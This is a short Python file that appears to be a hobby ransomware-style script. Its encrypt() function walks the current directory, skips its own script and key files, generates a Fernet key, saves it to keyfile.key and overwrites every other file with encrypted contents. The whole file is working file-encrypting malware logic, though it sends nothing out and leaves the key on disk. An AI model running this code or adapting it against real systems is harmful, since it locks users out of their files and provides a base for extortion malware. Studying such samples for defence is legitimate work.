import os
from cryptography.fernet import Fernet
def encrypt():
    files = []
    for f in os.listdir():
        if (f == "main.py") or (f == "keyfile.key") or (f == "decrypt.py") or (f == "encrypt.py"):
            continue
        files.append(f)
        print(files)
    key = Fernet.generate_key()
    with open("keyfile.key", "wb") as key_file:
        key_file.write(key)
    for file in files:
        with open(file, 'rb') as _file:
            contents = _file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, 'wb') as _file:
            _file.write(contents_encrypted)
